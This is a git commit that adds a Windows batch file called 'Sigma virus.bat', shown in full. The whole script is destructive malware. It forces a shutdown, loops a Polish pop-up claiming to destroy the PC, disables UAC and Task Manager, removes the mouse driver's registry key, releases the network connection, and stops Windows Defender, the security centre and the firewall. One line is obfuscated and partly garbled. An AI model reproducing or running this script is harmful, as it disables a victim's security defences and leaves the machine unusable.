b8268ee4278764943c242f9501c765fcb7995624
Kubas431 <kuba80269@gmail.com>
2024-09-14 09:03:56 +0200

    Create Sigma virus.bat

---
+++ Sigma virus.bat
@@ -0,0 +1,24 @@
+@echo off
+shutdown -s -t 40 -c "Zabijam system r"
+start charmap.exe
+echo do>>msg.vbs
+echo Msgbox"Pobieram dane... Zablokowuje system100% Niszcze pc100%",64+0,"Asystent zniszczenia">>msg.vbs
+echo loop>>msg.vbs
+start msg.vbs
+@Set RegistyEditCmd=Cmd /k Reg Add
+@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
+@Echo off & @@Break Off
+Ipconfig / release
+%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
+P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
+set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
+reg delete %key%
+reg add %key% /v Start /t REG_DWORD /d 4
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+net stop "SDRSVC"
+net stop "WinDefend"
+taskkill /f /t /im "MSASCui.exe"
+net stop "security center"
+net stop sharedaccess
+netsh firewall set opmode mode-disable
